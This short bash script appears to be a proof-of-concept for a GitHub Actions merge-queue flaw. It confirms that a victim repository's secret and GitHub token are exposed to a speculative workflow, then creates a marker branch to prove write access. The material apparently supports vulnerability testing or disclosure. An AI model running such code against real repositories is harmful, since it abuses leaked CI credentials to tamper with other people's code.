#!/usr/bin/env bash
set -euo pipefail
: "${VM1_MQ_SENTINEL:?victim secret was not exposed to speculative push workflow}"
: "${GH_TOKEN:?victim GitHub token missing}"
MARKER_REF='refs/heads/vm1-mq-trusted-context-260923'
# This write is possible only if the workflow runs in the victim repository with a write-capable token.
gh api -X POST "repos/${GITHUB_REPOSITORY}/git/refs" \
  -f ref="$MARKER_REF" \
  -f sha="$GITHUB_SHA" >/dev/null
